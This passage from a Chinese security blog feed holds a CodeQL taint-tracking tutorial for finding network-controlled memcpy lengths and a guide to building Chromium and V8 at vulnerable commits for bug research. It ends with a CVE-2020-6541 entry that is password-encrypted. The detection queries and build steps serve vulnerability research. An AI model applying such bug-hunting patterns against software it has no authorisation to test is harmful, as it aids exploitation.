<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall c, Function f</span><br><span class="line">where c.getTarget() = f <span class="keyword">and</span> f.getName() == <span class="string">"memcpy"</span></span><br><span class="line">select c</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step7:  使用Step6的技巧，查询宏定义的调用位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation invoc</span><br><span class="line">where invoc.getMacroName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>)</span><br><span class="line">select invoc</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step8: 改变select的输出。查找这些宏调用所扩展到的顶级表达式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from MacroInvocation mi</span><br><span class="line">where mi.getMacro().getName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>)</span><br><span class="line">select mi.getExpr() <span class="comment">// 注意这里的.getExpr()</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step9：编写一个类。用<code>exists</code>关键字来引入一个临时变量，以设置当前类的数据集合；特征谓词在声明时会被调用以确定当前类的范围，类似于C++构造函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkByteSwap</span> <span class="title">extends</span> <span class="title">Expr</span>&#123;</span></span><br><span class="line">    NetworkByteSwap()</span><br><span class="line">    &#123;</span><br><span class="line">        exists(MacroInvocation mi |</span><br><span class="line">            mi.getMacroName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>) <span class="keyword">and</span></span><br><span class="line">            <span class="keyword">this</span> = mi.getExpr()</span><br><span class="line">          )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n, <span class="string">"Network byte swap"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step10：数据流分析。若<code>memcpy</code>中<code>length</code>直接来自于远程，而不加以验证，那么这将会产生OOB漏洞。以下编写的CodeQL查询针对的就是这类情况，它将使用全局数据流分析技术，查出真正的CVE漏洞。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置用于交换网络数据的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkByteSwap</span> <span class="title">extends</span> <span class="title">Expr</span>&#123;</span></span><br><span class="line">    NetworkByteSwap()    &#123;</span><br><span class="line">        exists(MacroInvocation mi |</span><br><span class="line">            mi.getMacroName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>) <span class="keyword">and</span></span><br><span class="line">            <span class="keyword">this</span> = mi.getExpr()</span><br><span class="line">          )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置污点跟踪的分析信息</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration&#123;</span><br><span class="line">    Config() &#123; <span class="keyword">this</span> = <span class="string">"NetworkToMemFuncLength"</span>&#125;</span><br><span class="line">    <span class="comment">// 覆盖原先的isSource. 该谓语用于表示满足控制流源头的表达式.</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSource(DataFlow::Node source)&#123;</span><br><span class="line">        source.asExpr() instanceof NetworkByteSwap</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 覆盖原先的isSink, 该谓语用于表示满足控制流尽头的表达式.</span></span><br><span class="line">    <span class="keyword">override</span> predicate isSink(DataFlow::Node sink)&#123;</span><br><span class="line">        exists(FunctionCall c | c.getTarget().getName() = <span class="string">"memcpy"</span> <span class="keyword">and</span> sink.asExpr() = c.getArgument(<span class="number">2</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查询</span></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">"Network byte swap flows to mmcpy"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="八、结语">八、结语</h2>
<ul>
<li>当我们深入学习Codeql之后，我们就可以使用CodeQL挖掘特定漏洞模式的漏洞。</li>
<li>CodeQL入门大致如上所示，更深层次的使用需要翻阅各种QL API来结合使用，<a href="https://help.semmle.com/QL/learn-ql/cpp/introduce-libraries-cpp.html" target="_blank" rel="noopener">CodeQL library for C and C++</a> 由此进。</li>
</ul>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>CodeQL</tag>
      </tags>
  </entry>
  <entry>
    <title>下拉&amp;编译 chromium&amp;v8 代码</title>
    <url>/2020/11/fetch-chromium/</url>
    <content><![CDATA[<h2 id="一、背景">一、背景</h2>
<ul>
<li>
<p>由于chromium的多线程、多进程机制较为复杂，因此调试起来较为麻烦，通过源代码层面打log来调试显得十分必要，而且源码级调试可以大幅度降低调试难度。</p>
</li>
<li>
<p>同时，倘若需要某个特定版本的chromium时，委托他人代为编译也较为不便，</p>
</li>
<li>
<p>因此，手动编译chromium是十分必要的。在这篇文章中，笔者将自己下拉代码&amp;编译代码的步骤列入其中，仅供参考。</p>
</li>
</ul>
<a id="more"></a>
<h2 id="二、前置操作">二、前置操作</h2>
<ul>
<li>
<p>由于国内神奇的网络环境，我们需要设置一下代理服务</p>
</li>
<li>
<p>首先在linux端下载shadowsocksr</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:shadowsocksrr/shadowsocksr.git</span><br></pre></td></tr></table></figure>
<p>修改<code>shadowsocksr/user-config.json</code>的内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>: <span class="string">"&lt;server IP&gt;"</span>,          <span class="comment">// 服务器IP</span></span><br><span class="line">    <span class="attr">"server_ipv6"</span>: <span class="string">"::"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>: &lt;server Port&gt;,     <span class="comment">// 服务器的ssr端口</span></span><br><span class="line">    <span class="attr">"local_address"</span>: <span class="string">"127.0.0.1"</span>,     <span class="comment">// 本地地址，这里无需修改</span></span><br><span class="line">    <span class="attr">"local_port"</span>: <span class="number">52001</span>,              <span class="comment">// 本地用于监听socks5的端口，ssr开启后请求将转发至该端口</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">"password"</span>: <span class="string">"&lt;server Password&gt;"</span>,  <span class="comment">// 服务器端的ssr密码</span></span><br><span class="line">    <span class="attr">"method"</span>: <span class="string">"rc4-md5"</span>,              <span class="comment">// 加密方式</span></span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"auth_aes128_md5"</span>,    <span class="comment">// 协议</span></span><br><span class="line">    <span class="attr">"protocol_param"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"obfs"</span>: <span class="string">"tls1.2_ticket_auth"</span>,     <span class="comment">// obfs</span></span><br><span class="line">    <span class="attr">"obfs_param"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"speed_limit_per_con"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"speed_limit_per_user"</span>: <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"additional_ports"</span> : &#123;&#125;, <span class="comment">// only works under multi-user mode</span></span><br><span class="line">    <span class="attr">"additional_ports_only"</span> : <span class="literal">false</span>, <span class="comment">// only works under multi-user mode</span></span><br><span class="line">    <span class="attr">"timeout"</span>: <span class="number">120</span>,</span><br><span class="line">    <span class="attr">"udp_timeout"</span>: <span class="number">60</span>,</span><br><span class="line">    <span class="attr">"dns_ipv6"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"connect_verbose_info"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"redirect"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后进入<code>shadowsocksr/shadowsocks/</code>，执行<code>local.py</code>以启动本地socks5</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python local.py</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还有一个server.py文件，主要用于服务器端建立ssr结点。这里我们不涉及这个，因此忽略该文件。</p>
</blockquote>
<p>之后，在本地的<code>local port</code>端口处（按照上面的配置信息，这里应该是52001端口），将会建立一个socks5监听端口。所有发送至该端口的数据将会被转发至远程ssr结点</p>
<blockquote>
<p>使用命令<code>netstat -ntlp</code>可以查看端口信息。</p>
</blockquote>
</li>
<li>
<p>socks5建立完成后，我们需要设置http/https代理转发，使得http/https数据可以被转发至socks5中。</p>
<p>因此我们需要下载<code>privoxy</code>，之后在其配置文件中追加一句指令开启代理转发，最后启动该服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install privoxy</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"forward-socks5 / 127.0.0.1:52001 ."</span> &gt;&gt; /etc/privoxy/config</span><br><span class="line">sudo service privoxy start</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>代理服务已经启动完成，现在我们需要设置curl和git使用代理来访问网络。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://127.0.0.1:8118</span><br><span class="line">git config --global http.proxy http://127.0.0.1:8118</span><br><span class="line">git config --global https.proxy https://127.0.0.1:8118</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>git代理已经设置完成，现在我们来下载最重要的工具<code>depot_tools</code>，这个工具用于下拉chromium/v8代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># clone depot_tools，并且把depot_tools的目录加到PATH环境变量</span></span><br><span class="line"><span class="comment"># 因为git加了代理所以第一个命令可以成功clone了</span></span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="comment"># /path/to/depot_tools改成depot_tools的目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'export PATH=$PATH:"/path/to/depot_tools"'</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment"># 重新加载.bashrc配置文件</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="三、chromium代码下拉及编译">三、chromium代码下拉及编译</h2>
<ul>
<li>
<p>chromium的代码下拉只要一句命令，非常简便，但必须使用git代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fetch chromium</span><br></pre></td></tr></table></figure>
<p>所有代码差不多有24G左右，下拉代码的过程中，最重要的是<strong>网络一定要好</strong>！由于git clone不支持断点续传，<strong>一旦下拉代码的过程中存在网络波动导致连接中断，那就功亏一篑了。</strong></p>
<blockquote>
<p>下拉chromium的代码只有这一条途径，别想着先下github上的代码再整依赖，这是无用的。</p>
</blockquote>
</li>
<li>
<p>代码下拉好后，安装一下代码编译所需要的依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo src/build/install-build-deps.sh</span><br></pre></td></tr></table></figure>
<p>如果该脚本不适用于当前linux版本，则直接尝试编译代码也可以，只不过有时候会提示某个命令无法执行而中断编译，此时只需要手动安装一下对应软件即可。</p>
</li>
<li>
<p>之后设置git分支</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 切换分支，如果编译最新版的话，就不用这行命令</span></span><br><span class="line"><span class="comment"># 如果是要调洞的话，就要在这里切到有漏洞的那个commit</span></span><br><span class="line">git reset --hard [commit <span class="built_in">hash</span> with vulnerability]</span><br><span class="line"><span class="comment"># 下载依赖</span></span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>开始尝试编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成配置文件</span></span><br><span class="line">  <span class="comment"># 其中 is_debug = true将会使得在编译chromium时，完整保留调试信息</span></span><br><span class="line">  <span class="comment"># is_component_build = true将会使得编译时产生拆分的众多.so/.dll文件，这样可以降低链接所需要消耗的时间</span></span><br><span class="line">  <span class="comment"># is_asan = true 编译时启动asan</span></span><br><span class="line">gn gen out/asan_debug --args=<span class="string">"is_debug=true is_component_build=true is_asan = true"</span></span><br><span class="line"><span class="comment"># 开始编译，预计耗时4个小时</span></span><br><span class="line">autoninja -C out/asan_debug chrome</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>编译完成后，即可启动chromium</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./out/asan_debug/chrome</span><br></pre></td></tr></table></figure>
<p>笔者启动chromium时，asan提示<code>odr-violation</code>报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kiprey @ Kipwn in /usr/class/chromium [14:19:24] C:1</span></span><br><span class="line">$ ./src/out/asan_debug/chrome</span><br><span class="line">=================================================================</span><br><span class="line">==189815==ERROR: AddressSanitizer: odr-violation (0x7f44b9504700):</span><br><span class="line">  [1] size=40 <span class="string">'vtable for media::VaapiDmaBufVideoFrameMapper'</span> ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span><br><span class="line">  [2] size=40 <span class="string">'vtable for media::VaapiDmaBufVideoFrameMapper'</span> ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span><br><span class="line">These globals were registered at these points:</span><br><span class="line">  [1]:</span><br><span class="line">    <span class="comment">#0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3</span></span><br><span class="line">    <span class="comment">#1 0x7f4471d6895b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libservice.so+0x2b5595b)</span></span><br><span class="line"></span><br><span class="line">  [2]:</span><br><span class="line">    <span class="comment">#0 0x55f8a95f810d in __asan_register_globals /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_globals.cpp:360:3</span></span><br><span class="line">    <span class="comment">#1 0x7f44b87abe7b in asan.module_ctor (/usr/class/chromium/src/out/asan_debug/libmedia_gpu.so+0x335e7b)</span></span><br><span class="line"></span><br><span class="line">==189815==HINT: <span class="keyword">if</span> you don<span class="string">'t care about these errors you may set ASAN_OPTIONS=detect_odr_violation=0</span></span><br><span class="line"><span class="string">SUMMARY: AddressSanitizer: odr-violation: global '</span>vtable <span class="keyword">for</span> media::VaapiDmaBufVideoFrameMapper<span class="string">' at ../../media/gpu/vaapi/vaapi_dmabuf_video_frame_mapper.cc</span></span><br><span class="line"><span class="string">==189815==ABORTING</span></span><br></pre></td></tr></table></figure>
<p><code>odr-violation</code>这类错误我们忽略即可，因此我们需要设置一下环境变量<code>ASAN_OPTIONS</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> ASAN_OPTIONS=detect_odr_violation=0</span><br></pre></td></tr></table></figure>
<p>之后即可正常执行chrome。</p>
</li>
</ul>
<h2 id="四、v8代码下拉及编译">四、v8代码下拉及编译</h2>
<ul>
<li>
<p>v8的代码下拉也很简单，一条命令即可，同样必须使用git代理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fetch v8</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后就和编译chromium一样，先设置git分支，再设置编译参数，最后开始编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line"><span class="comment"># 如果编译最新版的话，就不用这行命令</span></span><br><span class="line"><span class="comment"># 如果是要调洞的话，就要在这里切到有漏洞的那个commit</span></span><br><span class="line">git reset --hard [commit <span class="built_in">hash</span> with vulnerability]</span><br><span class="line"><span class="comment"># gclient sync 用来下载一些其他需要的东西，</span></span><br><span class="line"><span class="comment"># 这个还需要curl的代理，之前也已经在环境变量配置了</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment"># 设置编译参数</span></span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果需要切换特定版本，则使用以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里的&lt;TagName&gt;指的就是version</span></span><br><span class="line"><span class="comment"># 查看对应version/tag是否存在</span></span><br><span class="line">git tag | grep <span class="string">"&lt;TagName&gt;"</span></span><br><span class="line"><span class="comment"># 切换至目标version/tag</span></span><br><span class="line">git checkout &lt;TagName&gt;</span><br><span class="line"><span class="comment"># 下载对应依赖项</span></span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li>
<p>编译完成后即可执行v8</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./out.gn/x64.debug/d8</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>v8 还自带了gdb插件，可以让我们更加方便的使用gdb来调试v8。</p>
<p>在<code>~/.gdbinit</code>内添加以下两行即可使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /path/to/v8/tools/gdbinit</span><br><span class="line"><span class="built_in">source</span> /path/to/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure>
<p>有兴趣的话还可以简单阅读一下这两个文件，这样可以更好的了解 v8 插件的使用方式。</p>
</li>
</ul>
<h2 id="五、参考">五、参考</h2>
<ul>
<li>
<p><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html" target="_blank" rel="noopener">V8环境搭建，100%成功版</a></p>
</li>
<li>
<p><a href="https://chromium.googlesource.com/chromium/src/+/master/docs/linux/build_instructions.md" target="_blank" rel="noopener">Checking out and building Chromium on Linux</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-6541分析</title>
    <url>/2020/10/CVE-2020-6541/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="文章校验出错, 但仍可查看解密后的内容。"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码" /><label>请输入密码</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="df51f51ec3a63be6a9c5b883c5d610c3596c98712683d3db4cd04b730a76a89d">54d9e4c431966984504ae6707d5491b7507b3dd985a41c1f63ac0f0a4444ec68701b059385e55b5fbd615f027f79aaa779d2c007c195eef42c83042b114cfa69464a46a493737cf5be8b0e832f95aebbd2a0a9a3a7dd227bb72e7e884bdf6174daf2358f7420548f9d35b453b5b6e510be0d4522145ab70140314518546ef883e6a9334dcfbb48a68c36423afd020214aa80b8cdb87749331adc3da7e06ad9674334c822401d1b03fad743669f2fcf4ff602b3dd3e81944ce9d969d27f15fb949f57c67ad94fa1a292a213a8bbf6b413ab83c681e4f052469f5b40c81d0976cef75e2aaf558a9ffe976d23f089d1513ae4125777f92e4f3f9cf40078a037589cd0a507f8795a018494a05c829d090c50fb68d0a77a4f7da91939ef35489e5db113c1f9785c6513bafe3911adaf3669f248b8f2a9dbf77d87015ad513654b25711302839d61ca7be541e333ca84fb175363c924b1e98e13befa94de97d333063b04d1b21f03c120874f95c8684e726cdcfa67914634051c16856d34615851953ee8d2adf7d17e1f2bd6a52ff19bd9f542cc80c18e329f9f4bf94caeea15128fb6096ef22f32b7b51aa0b7a3d21ef732f6fa78f4868e113a2aba82acef7c43f0e10f7782a243a071952da2fe6f858b6e068c136f1f9f1f3ac20ce46ac5e6c59a2a0eb20e8a5bdc86084e91ed0e643cb93c4d13232ad21a56c327d5258f6e4580714d17484d1f873d21cce6a2724b6c520ce4b7eefcbdca838a86fafd349f0f1dee93eb528b7c65cf650c4ab436ab0372220d14b6ddea0e8144c9d84172627f6b4e00c2952d64ae7e4171738e6e3a0421172ab0d2a2fde33dea37d657cc09e1c190f5908f4d5e07b9f902515256dbfcda62661c7e2d08ab45def76052e1096573b5024a709a9e9be1b923d312a1a24b87c1cb2ab304955eccb5ed574150b05cdc4cb816e423acf923729e00acbfbc5b5ef97a534cfe3569101c67a2e11d4062e83ac9769ecde0fcffd140463014112ed01507ca560990932d94713232110bc73f860551feddd095e093292610808f4f62a345fdf0308c10e6b80c9a74e012cdb7a3cb485b2ee309a1b82264388f54b698bf07f45edb805d30502223050c93008361f967da9cc2595427f54c97f8b040625e995c2e13251495a05e2387b0ca309d1220ec4663ed692d41bdaca16b2d5b1202602d47bfa528ee340e2b1665da2fa3965860e943c676cf5da3f95ec3ca0acd13c9b3c5db16c012b3f3378f42fec79e043a453e7c57928cf7d2845a853a36c93a776bb65bf3c42fdcd29e21e947fbdc938a30b8cf5a0b3eb8f997f3204ea56d087bd6a6c3d3d76c08be2e71bf1892f15d677a099316daf10d1ca585ba640b5081d7dd0084912a1d38701eb131e88545aec78f97d833beca7ff12c227ab124539983aced4ca5f4e55429b996b78bc91a922c76fbe0abd7dbf89d3174a8e1d8cfbdf3bda7f07f4e1a8a8f072a1ad5fa01a7f5f9b29f73d672d2e5d92e3ce34a054de265a472ea407f20be52608d91c90b3814658a49be013bff0e6549250c903641c71667cd1ea609e60415595159ef395d70166aaa0eec8145870b10138f494beffb94510aff616e4e83f70c4223c06ea0307418aa8f88472177f95fec30cc081eae3f4a9bf0178877f6b0946b7ac25978ab7516d79a9b66cc1fd1da99fa75ab84c56ecff7b1d044e7de69c57ed1b8d5628efce6d95d9d7c2d4e438cf45b07ccb5005186c48de888e56905463afd10e96c2db81617c8026a7a48d07e9626439599f8975e4c4096675806a7dc02adfc03223db9421837123c2e67f49d06476581470c4839a3b83dafb4ada126def7a508b1e1869db6c757bc72b3069368578686cff939edcd3610197023b9579a2cfd617c33ff5a6b6683c41fb59bae806bebb9803511887c94ef3168592307646af6bedb208a9d624b9cbec56d78e4c1e86bd3c77e16be0931d35b82517d86735f2f49583086b7fa7b9b24952c96d893e9aa3c74cf55f925d7568fd774796e3c8f4ef365e5fde8d46209cd92518bd7f5f8a5044521b5497600fcae4b7e88f0b8ba95fd57e13ceee576739832d52505a849c91f5b02e3a12d4c5d2a994a4c241941f3f01957a904a02a54702f235cbb9fddf52a1f087925e18ad15a69e1106439886bf5b6427904a30255efc8f5d73012868b6e83252c60a6816ba6273c876d9045a2e3f9c5e09d568daa9aa5c41ebb81e3fbf4b7b74c10442362d7b6c19ec1b8fd804eced50d3aebc5023afba16b5f9a286605482ab94d4680012a58b682c11a5ee6ec8d85f0367d29aa12e6f5e3c5389c103d7066918a7669e47ab3f4148b36e977891933f602a3a53e35c3834e3b22de74d3aa9642193724c50abab1048cdcc62caf48227b1e3ef22c20223adbf606799068b3a7680db6887b446d11db85864226a24c24a3e5c02e255508921f4dcde7443f9f8b4eb2c192b6213cc245cb2847084f0318d7c3b7db3c7ec536f18af8606f70a66f0dea4a2503c6a2d499947a2744df15f13ed4d45a731cc4ce261c226a2b6e1d1fb6e6c17281255cb728db66f7f80ac53976c4fb061a0f025d615f6c234a4fd8d2fc6cd769b775fdb52510a5ada8c6a3b418280a2276992425597807e23a64b3323e396edbe5481b98f680f349d9bb620171f9b21a5b52f9d3ab9ec0b7041ec9536b096fc87c0aeb503748a4442e18c7ef54b62441d679a5bfaf9a068962631c3ad37ab6c2224f9d677f125d30979a2a1ec7f2fe734d02a3e094b4ab153ab99953fd38690a6e0b50b1e4104be2d0b197854f26c2cbd2767aa5326a4e38ae2ddb1d10c55eaca0390b2ebc4a3bb4f3f55c6abeda4ad77c812e354bc1f44302b2c93659d6fcf0fb2610bd1a95c79173509bf0fb5312be15d0422e80579a46f417a79cc725cdad845ad3d84b1a9945a0de05abdb4c0a365bec3e2cbcb195e3148acc4d1308faf4b49066ef8878ea9eb5ab587e73e315717fceef26fc9ca852c5f023656512db7e4573d8d791ba796ab21fff9c6231c3c168b732a1105ed42f3345210a141ca8501377952fa4d56fb8e9dded06cc3eebe2b8241ca3daa8c8b487470a059ea12c05cc78d41dfca6f7a14adaa9c905bd0f606f80ffa0438ba485d7423bdcfc1dad2ccd12ce26d6009bd55d59bd4e66c64d74dbc72db63ed377898cd8fa56378de56a73b69d494e246644ca931e76d1ff0445c2af6b5d511acbcb2c5b0a484f10f877a3c880ccdcdf8cb857c4e2d8b862ce880c1b8fa3e17e91a6173cedc6fef61b31fdd3cb8d5cbea418d2db8553fadcc82816c354a296f390907eef274a90620e9bace72d78e0ffe1560a51f0ab5cb59b76457040d0ba271fdf01b19a990c49fac9609bf2b4035187ca4b5208eb5299e869cdb409f4469dfb318d2c6cc5279a471a9fa2bfbddb43700a84d6b1c9d0ad0d422bf0a97b757d3f989db5800878e7d16840ef784177fc9fe26590024b675633b26b1253d7ece82e13c0be60cdc7872e793c18ca8d7a90b38984b52f1c046e56daa449fc7db9d4fcf0ff840cc03bff7a408a78d05e526b61d5f9fc0efd34a21c7461ec24d0af4f84d9cdfdac4c6b9162ab3afe217e8e2b0e04454b48131009436fa5dc44e19ac1067d62b449b424c4a93ac52ba1253ba27ca569bda7653ce3e07f39616053700e4c82cfa1b5491086c04156644aa13b78fa090b73834ca84250515fb25dcfb8677618e988fa9dfb2a89ad8477a3e70b1876a1670b91d3581e133d07de0960df988fea8c9c719611da710cfe10b9ca8706bef246da9bf1c479801c44b59b76d13db20adfbce294aebe14f4966b5cc9bd1c824cc215f39f312325306275f4b1fdaae0b18ed7217d0b4d39664894d1f6c19fe40547e458dafe9e0f0267d2c0c7e91a3ea008078976b16997b29cf5812f67935c10774acb160c4cf42143ec07a69b64930b88da39b4aedd2f1068098671049a1915e29fecc6eca7ba6ddd0c31fb05dedb4dbae18e8f4d6b241472c2575dda07e7524230d990d5ce32b0186229b945b9a2e108169db1dc6fb6e824e853444ced428869768b6150413489416e9af868f59437360cd7e4688b4796d91a973631770482c51a4ec9100abffcd864f5addb229ef0ebadfe97d75f522895ec241184b7797bc5afead9d63bb839c542d29646925fe3b2e5eb969fd6b8e202f70b80a7614926bfebe607e619f5899d8a64dcde092aec951d25c55a28c67d14a02f9ef384e97102780f4a5959cfba7cdcd69a15ca93dfae2c04600a3e1955eecc65f98221037390c570fc92b0f9b6defd40956ce25142e2ee26f8e1b7e2ed3a1ca4b07c76b4bd7ad81fff453f105131d8acfd3c4b79cb1fe244ae36b2d2f8928bd7b8ccdc6632a0d429b7869bcbbc05d615be799930838c1f9411451dd082675d09293429b349844f3d65886fd635cc91542f6eae0df45debfc59048f090afbf3eefca7edb59865694bf2076a6cb3610c8d577a0f859ad31959293060f52b51d4216533e147967060b94ce8db30fee1dc5dc700341aea4debc9a5902e551b6954b5153849e51024c3e1e22e1a7c6f065de23cfe58e16d5226bc10323b6fbf52cd8abcc7c32f65517600fd7bf607794fd752a18906474afa0789d9573f2ce64b7887bfe877aa87754a7855845f7328c19bdd02412bf78f34344564a7429aa502a3ee44389a491041f147dc9e8ab560722710c040697a1e275a91d50554ac129535aae2b4bfe35a9ef2ca16b0845d6cb129eec7ea73a6d34ac41e97fc693fcc73f9acd0da52ee0154dd6989adea9a6fbcbc1cb5808f4635350511b6bcf643fe9a5051be01fa744da6fafe7f4f8458f94fa41cca53461fda9d9474bd502a5e28edebbd078be197788931bb49d93997a1b8d87a12bfbaf13f2192aa3b411738615eeebd6eb9e5e05f482b774ea50ef0b417ad8ad1a8896f1783bc2f23e5ef14a18db1c0b28e5631c185071b3759473f02aad48d4c18fc2160fa1b516e056acbb8d4336217c3b84182b73baaa644dc03ffd2b45d0a1182e1f59bc4d87a02be630bac37130ec1d680af099bf8e26cab4abbfe52f598e7f617a8f977f43eae45fc3fc2c1ade29abf4881bc4fbd1bea38bc3f8dda243000340237580680094eafc39e478aa1e0421f6d364346648fb8b21e72d2591a772bdc6f9a138b5f3895dac8944d599ad0b9088e0d9109a03ef7b9eb9b72ef20fdb61bd42d9f284b91a4e5081d38cec8f7fbed7b538287af8bc3ccbcf146fbb2047ffc641b263bacc45fdecf504455b243a7640b1ca68c35071b306a5a1e54a5a9ceb64735a723ac5573c51237fb13c525c0c01963e1f7f88d447fd4e9249006f130c5234adeeb88cb436131c73d3059a39b673f3a7f9870adf4f5056d37bae91182102cde5f282d767a7db9e4eed7858919caaac7aa221957e9123e946c4a28c7a17c6ebd51876e588ec39dc5b3ad2e03fdc244d6e1897d09c56790fc9698084babfa708dee508ed1f16fb8a6f08daf800791618f0bcedaf0162cdfb5fe3f9689330b469c3bfdb0231c7349050b95f2fe7d2a82eb3dd4d21baa5ed581f75a307b628e6ffcb8df353aaf57645ff7106cff32cf04e7a4dbbc3c4a0ddff917f75cc3c293ea6b9f324c199d2071ce9c19da747e490b1f9bb968304bb29f578390f5622f8a889e6c380bc48f01f45a84208f2b67ff2ecea5c8c1bf9d916859e7b454838d662a1b2f26a274da268ec0ffecc9f8035d6f1893933fd86f7c4a182c48633be663af8cb618385541a94fd8a604ce9bb9a6fe9461cb231a33cedff005fe81944e33310